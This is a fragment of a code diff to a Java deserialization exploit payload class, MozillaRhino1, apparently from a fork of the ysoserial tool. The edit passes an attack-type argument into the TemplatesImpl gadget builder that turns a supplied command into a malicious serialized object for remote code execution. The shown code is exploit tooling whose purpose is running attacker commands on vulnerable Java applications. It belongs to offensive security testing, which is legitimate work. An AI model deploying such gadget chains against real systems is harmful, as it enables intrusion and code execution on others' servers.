@@ -22,6 +22,8 @@ import java.lang.reflect.Method;
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({ Authors.MATTHIASKAISER })
 public class MozillaRhino1 implements ObjectPayload<Object> {
+	
+	// federicodotta - All supported (TemplateImpl)
 
     public Object getObject(final String command, String attackType) throws Exception {
 
@@ -54,7 +56,7 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
         Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
         getter.set(slot, memberboxes);
 
-        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command), TemplatesImpl.class);
+        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command, attackType), TemplatesImpl.class);
         idScriptableObject.setPrototype(nativeObject);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
